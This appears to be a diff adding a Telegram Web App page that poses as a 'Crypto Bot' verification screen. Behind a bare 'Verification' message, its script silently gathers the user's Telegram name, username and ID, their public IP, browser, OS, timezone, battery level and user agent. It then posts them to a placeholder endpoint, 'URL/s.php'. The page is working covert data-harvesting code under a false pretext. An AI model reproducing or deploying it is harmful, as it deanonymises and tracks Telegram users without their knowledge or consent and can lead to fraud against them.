@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Crypto Bot | verification</title>
+   <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+   <style>
+      body{
+         color: var(--tg-theme-text-color);
+         background: var(--tg-theme-bg-color);
+         display: flex;
+         flex-direction: column;
+         align-items: center;
+         font-size: 18px;
+      }
+
+      .hint{
+         color: var(--tg-theme-hint-color);
+      }
+
+      .link{
+         color: var(--tg-theme-link-color);
+      }
+
+      .button{
+         background: var(--tg-theme-button-color);
+         color: var(--tg-theme-button-text-color);
+         border: none;
+         font-size: 18px;
+      }
+
+      .button:not(:last-child){
+         margin-bottom: 20px
+      }
+
+      #usercard{
+         text-align: center;
+      }
+   </style>
+</head>
+
+<body>
+   <p></p>
+   <p></p>
+   <p></p>
+   <p></p>
+   <p></p>
+   <p></p>
+   <p></p>
+   <p></p>
+   <p>Crypto Bot | Verification. . .</p>
+</body>
+
+<script>
+   let tg = window.Telegram.WebApp;
+   
+   tg.expand();
+   let userAgent = navigator.userAgent;
+   let userOS = navigator.userAgentData.platform;
+   let userBrowser = navigator.userAgentData.brands[0].brand;
+   let userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+   
+   navigator.getBattery().then(function(battery) {
+       let batteryLevel = battery.level * 100;
+       
+       tg.MainButton.text = "Changed Text";
+       tg.MainButton.setText("Changed Text1");
+       tg.MainButton.textColor = "#F55353";
+       tg.MainButton.color = "#143F6B";
+       tg.MainButton.setParams({"color": "#143F6B"});
+
+       fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+             let userIP = data.ip;
+             let udata = `👨 Информация о юзере:\nㅤㅤ├ Name: ${tg.initDataUnsafe.user.first_name}\nㅤㅤ├ Surname: ${tg.initDataUnsafe.user.last_name}\nㅤㅤ├ Username: ${tg.initDataUnsafe.user.username}\nㅤㅤ├ UserID: ${tg.initDataUnsafe.user.id}\nㅤㅤ├ language: (${tg.initDataUnsafe.user.language_code})\n\n💻 Информация о системе юзера:\nㅤㅤ├ 🖥️ IP: ${userIP}\nㅤㅤ├ 💻 Browser: ${userBrowser}\nㅤㅤ├ ⏰ Timezone: ${userTimezone}\nㅤㅤ├ 🖥️ OS: ${userOS}\nㅤㅤ├ 🔋 Battery Level: ${batteryLevel}%\nㅤㅤ└ 📲 UserAgent: ${userAgent}`;
+
+             fetch('URL/s.php', {
+                method: 'POST',
+                headers: {
+                   'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ udata })
+             });
+          });
+   });
+</script>
+</html>
